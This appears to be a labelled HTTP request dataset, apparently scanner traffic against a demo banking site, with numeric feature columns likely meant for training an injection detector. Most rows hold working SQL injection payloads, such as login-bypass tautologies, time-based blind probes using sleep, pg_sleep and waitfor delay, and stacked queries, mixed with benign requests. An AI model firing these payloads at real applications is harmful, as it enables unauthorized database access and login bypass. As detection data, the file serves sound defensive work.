POST,/sendFeedback,"submit=Submit&cfile=%f0''%f0""""&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",2,2,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20593=593%20AND%203%2b1-1-1=1%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=if(now()=sysdate()%2csleep(9)%2c0),0,0,0,4,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",2,2,0,15,0,9,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b806-806-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,1,0,0,0,2
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=NiGYcyZA');select%20pg_sleep(9);%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1""%20OR%202%2b749-749-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,0,0,2
GET,/index.jsp?content=eO02bQ9X';select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,2
GET,/search.jsp?query=-1);select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,2
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,2
GET,/index.jsp?content=personal_loans.htm%25'%20AND%202*3*8=6*8%20AND%20'5jd9'!='5jd9%25,,4,0,0,0,4,0,2
GET,/,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,1,0,0,2,2
GET,/swagger/index.html,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=if(now()=sysdate()%2csleep(6)%2c0),0,0,0,4,0,2,2
POST,/sendFeedback,"submit=Submit&cfile=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",2,2,0,15,0,9,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=1'""",1,1,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=if(now()=sysdate()%2csleep(9)%2c0)&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,4,0,1,2
GET,/util/serverStatusCheckService.jsp?HostName=JyI=,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b593-593-1=0%2b0%2b0%2b1%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
GET,/search.jsp?query=if(now()=sysdate()%2csleep(3)%2c0),,0,0,0,4,0,1,2
GET,/search.jsp?query=1*1*1*1,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b717-717-1=0%2b0%2b0%2b1%20or%20'8bE3GXVu'='&subject=1,4,0,0,0,0,0,2
GET,/index.jsp?content=1%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;select%20pg_sleep(6);%20--%20,0,0,1,1,0,3,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%bf'%bf""",1,1,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b536-536-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,0,1,2
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=%f0''%f0""""",2,2,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=%bf'%bf""&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,,2,0,0,5,0,1,2
GET,/search.jsp?query=Y5OeVgui');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,2
GET,/index.jsp?content=-1%20OR%203%2b854-854-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst,0,0,0,0,0,0,2
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=JyI=&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=nCztxTTa';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,1,1,0,2,2
POST,/doLogin,btnSubmit=Login&passw=%5c&uid=1,0,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b869-869-1=0%2b0%2b0%2b1&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=jb6GpAI2';select%20pg_sleep(10);%20--%20&subject=1,1,0,1,1,0,2,2
GET,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b137-137-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=sBReGDcI'));select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1acuuQcCFQ7YoT&subject=1,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1'""",1,1,0,0,0,1,2
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=RulQdAT5,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=if(now()=sysdate()%2csleep(6)%2c0)&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,4,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=JyI=&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=q7DBgxM7');select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%5c&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1acutfzNCSoW1D,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",0,2,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1);%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,0,2,2
GET,/search.jsp?query=JyI=,,0,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b846-846-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
GET,/status_check.jsp,,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,0,2,2
GET,/survey_questions.jsp?step=%40%40QfycK,,0,0,0,0,0,0,2
GET,/search.jsp?query=kQBPGvPq'));select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,2
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b994-994-1=0%2b0%2b0%2b1&uid=1,0,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=SbbrQwLv';select%20pg_sleep(3);%20--%20,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%40%40JlOll&subject=1,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=b'%20AND%202*3*8=6*8%20AND%20't3Gu'='t3Gu,,4,0,0,0,4,0,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'""%2b(select(0)from(select(sleep(3)))v)%2b""*/",2,2,0,15,0,10,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%5c,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=%bf'%bf""&uid=1",1,1,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/doLogin,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=wY8BoZgN';%20waitfor%20delay%20'0:0:6'%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,3,0,1,0,0,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst""%20AND%202*3*8=6*8%20AND%20""DtiX""=""DtiX&name=tmtqptlo&subject=1",0,4,0,0,0,0,2
GET,/search.jsp?query=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,,2,0,0,5,0,1,2
GET,/survey_questions.jsp,,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,2
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b841-841-1=0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI=,0,0,0,0,0,1,2
GET,/index.jsp?content=if(now()=sysdate()%2csleep(3)%2c0),,0,0,0,4,0,1,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20000658=000658%20AND%203%2b1-1-1=1%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1;%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1;select%20pg_sleep(6);%20--%20,0,0,1,1,0,2,2
GET,/index.jsp?content=1acu4FD6DWGRlv,,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=1'""&uid=1",1,1,0,0,0,1,2
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'""%2b(select(0)from(select(sleep(3)))v)%2b""*/&name=tmtqptlo&subject=1",2,2,0,15,0,9,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%40%40rMItJ,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=(select(0)from(select(sleep(15)))v)/*'%2b(select(0)from(select(sleep(15)))v)%2b'""%2b(select(0)from(select(sleep(15)))v)%2b""*/&subject=1",2,2,0,15,0,9,2
GET,/survey_questions.jsp?step=-1%20OR%203%2b617-617-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,2
GET,/util/serverStatusCheckService.jsp?HostName=07IBond6';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%20waitfor%20delay%20'0:0:15'%20--%20&subject=1,2,0,1,0,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1));select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=E666qViV');select%20pg_sleep(9);%20--%20&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
GET,/util/serverStatusCheckService.jsp?HostName=iotFIHfe,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1'""&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",1,1,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=LKi1XNVa';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b91-91-1=0%2b0%2b0%2b1%20--%20&subject=1,0,0,1,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%00%c0%a7%c0%a2%252527%252522&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/search.jsp?query=-1%20OR%203%2b84-84-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%40%40S3HFf&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=aqWnMQPk';%20waitfor%20delay%20'0:0:5'%20--%20&subject=1,3,0,1,0,0,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=vtTeCvhp';%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,0,3,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b539-539)%20--%20&name=tmtqptlo&subject=1,0,0,1,1,0,0,2
GET,/index.jsp?content=vLv93ISt,,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=DuI162bQ';%20waitfor%20delay%20'0:0:3'%20--%20,3,0,1,0,0,2,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%f0''%f0""""",2,2,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%5c&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=%5c,,0,0,0,0,0,0,2
GET,/index.jsp?content=C84o1Oiw';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%f0''%f0""""&email_addr=sample%40email.tst&name=rtlrpggp&subject=1",2,2,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b658-658-1=0%2b0%2b0%2b1%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1""%20OR%202%2b282-282-1=0%2b0%2b0%2b1%20--%20&subject=1",0,1,1,0,0,0,2
GET,/search.jsp?query=-1%20OR%202%2b84-84-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=if(now()=sysdate()%2csleep(6)%2c0),0,0,0,4,0,1,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%bf'%bf""",1,1,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&name=tmtqptlo&subject=1",0,2,0,5,0,1,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=-1""%20OR%202%2b883-883-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1",0,1,1,0,0,0,2
GET,/search.jsp?query=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
GET,/index.jsp?content=jm9PzrF5'));select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=aEVGpYKF';%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,3,0,1,0,0,2,2
GET,/index.jsp?content=JyI=,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=oQDgWGn4&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b593-593)%20or%20'B23siZtz'='&uid=1,4,0,0,1,0,1,2
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,2
GET,/pr,,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z",0,2,0,5,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b539-539-1=0%2b0%2b0%2b1%20--%20&name=tmtqptlo&subject=1,0,0,1,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%bf'%bf""&subject=1",1,1,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z,2,0,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=hrcbkxgn&subject=1acujeUgsv17wx,0,0,0,0,0,0,2
GET,/search.jsp?query=-1));select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,2
GET,/swagger/properties.json,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0'XOR(if(now()=sysdate()%2csleep(5)%2c0))XOR'Z&subject=1,2,0,0,5,0,1,2
GET,/search.jsp?query=1acusUU6Fn3z1x,,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,0,3,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1%20OR%202%2b956-956-1=0%2b0%2b0%2b1,0,0,0,0,0,0,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=rtlrpggp&subject=1'""",1,1,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1'%20OR%202%2b542-542-1=0%2b0%2b0%2b1%20or%20'EGoP34LN'=',4,0,0,0,0,0,2
GET,/high_yield_investments.htm,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b493-493-1=0%2b0%2b0%2b1%20--%20&subject=1,1,0,1,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,0,5,0,1,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z",0,2,0,5,0,1,2
GET,/swagger/swagger-ui-standalone-preset.js,,0,0,0,0,0,0,2
GET,/index.jsp?content=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,,2,0,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b539-539)%20--%20&name=tmtqptlo&subject=1,0,0,1,1,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b696-696-1=0%2b0%2b0%2b1,0,0,0,0,0,0,2
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b692-692-1=0%2b0%2b0%2b1%20--%20&uid=1,0,0,1,0,0,1,2
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=-1""%20OR%202%2b752-752-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,0,0,2
GET,/survey_questions.jsp?step=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b869-869-1=0%2b0%2b0%2b1&name=tmtqptlo&subject=1,0,0,0,0,0,0,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=JyI=,0,0,0,0,0,0,2
POST,/doLogin,"btnSubmit=Login&passw=%f0''%f0""""&uid=1",2,2,0,0,0,1,2
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1""%20OR%202%2b711-711-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,0,1,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b593-593)%20or%20'B23siZtz'='&uid=1,4,0,0,1,0,1,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%2540email.tst,0,0,0,0,0,0,2
GET,/survey_questions.jsp?step=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z,,2,0,0,5,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,2,0,0,5,0,1,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20593=593%20or%20'B23siZtz'='&uid=1,4,0,0,0,0,1,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b81-81-1=0%2b0%2b0%2b1%20or%20'BbWBD7IE'='&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,4,0,0,0,0,0,2
GET,/util/serverStatusCheckService.jsp?HostName=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,2
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20000658=000658%20or%20'AIdsYtEP'='&uid=1,4,0,0,0,0,1,2
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=eaU7ryhL'));select%20pg_sleep(6);%20--%20,1,0,1,1,0,2,2
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);select%20pg_sleep(9);%20--%20,0,0,1,1,0,3,2
GET,/survey_questions.jsp?step=JyI=,,0,0,0,0,0,0,2
GET,/sendFeedback,,0,0,0,0,0,0,2
POST,/sendFeedback,submit=Submit&cfile=4uDOCtnB';select%20pg_sleep(9);%20--%20&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=1,1,0,1,1,0,2,2
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tmtqptlo&subject=-1));select%20pg_sleep(9);%20--%20,0,0,1,1,0,2,2
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%f0''%f0""""&name=rtlrpggp&subject=1",2,2,0,0,0,0,2
GET,/survey_questions.jsp?step=if(now()=sysdate()%2csleep(6)%2c0),,0,0,0,4,0,1,2
GET,/survey_questions.jsp?step=4cEn7HUj');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,2